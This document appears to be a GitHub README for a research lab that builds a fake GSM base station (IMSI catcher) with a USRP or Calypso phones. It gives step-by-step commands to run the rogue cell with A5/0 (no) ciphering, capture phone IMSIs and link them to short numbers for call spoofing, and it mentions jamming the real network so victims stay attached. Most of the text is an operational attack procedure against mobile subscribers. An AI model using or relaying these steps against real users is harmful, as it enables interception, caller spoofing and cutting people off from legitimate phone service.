# GSM4_IMSICATCHER_HALFMITM_SPOOFING-CALL-WITH-PHYSICAL-MS
* [motorola](https://www.youtube.com/watch?v=ZKa86zAWmQY&pp=ygURZ3NtIHNuaWZmaW5nIDI5YzM%3D) documentation
* [spoofing](https://github.com/godfuzz3r/osmo-nitb-scripts/tree/master)
* [phddays](https://sudonull.com/post/97315-MiTM-Mobile-contest-how-they-broke-mobile-communications-at-PHDays-V-Positive-Technologies-blog)
# Half MITM = Fake BTS only
<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/2G.jpg">
</p>

# Why it is possible ?
* Fake base station with open ciphering named A5/0, and the  network could be GSM(sms, call), and GPRS, EDGE

# Attack limitations and advantages 
* local attack but could be targeting (to find local victim)
* victim couldn't be reached on the real network (indeed call and sms)
* could be detectable with rooted phone and application like imsi-catcher detector, snoopsnitch because of open network

# Devices  
* USRP
* Two motorolas phone (aka calypso phone on google)

# Pratices
* Install DragonOS 29 or 30 for USRP and debian 9 or 10 for motorola phone
* Create fake bts with open ciphering (A5/0)
* Add one users and modify core network for associating it with number like 8OO or 807 or 808 or 204 or 209 or 121 or 0333300121
* wait for call 


* Solution 1 using USRP
(more stable and no need synchronization of existing BTS so if we jam the existing BTS the half mitm still exists)
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts.zip
```
```
cd osmo-nitb-scripts
```
Database is at : /var/lib/osmocom/hlr.sqlite3  
Installing all config  
```
bash install_services.sh
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
Running main_uhd_spoof associate with configs/openbsc_spoof.cfg  
ctrl+shift+T  
```
cd osmo-nitb-scripts
```
```
python3 main_uhd_spoof.py
```
ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof1
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
```
bash finding_imsi_extenstion.sh
```
You could find imsi and extension  
let's see for example imsi as 646040222463674 and extension as 126
```
bash set_imsi_extension.sh 646040222463674 808
```
Verify by if the association is correct
let's see for example imsi as 646040222463674 and extension as 808
```
bash finding_imsi_extenstion.sh
```
* solution 2 : Not stable for dragonOS, should install [karly](https://www.youtube.com/watch?v=_nGVeG_76W8&pp=ygUJa2FybHkgZ3Nt)
For all [karly_installation](https://github.com/SitrakaResearchAndPOC/CalypsoBTS_Debian)
Use scripts : finding_imsi_extenstion.sh and set_imsi_extension.sh for associating the imsi with extension 808  
Modify the path of database as hlr.sqlite3     
Pratices  (bonification):  
Installing docker on dragonOS where the OS is debian 9 or 10  
Installing all checkout like [karly_installation](https://github.com/SitrakaResearchAndPOC/CalypsoBTS_Debian)
Use scripts : finding_imsi_extenstion.sh and set_imsi_extension.sh for associating the imsi with extension 808  
Modify the path of database as hlr.sqlite3     
Create a github to just install CALL_SPOOFING on docker with dragonOS 29 oir 30 with the two scripts and test it directly
 



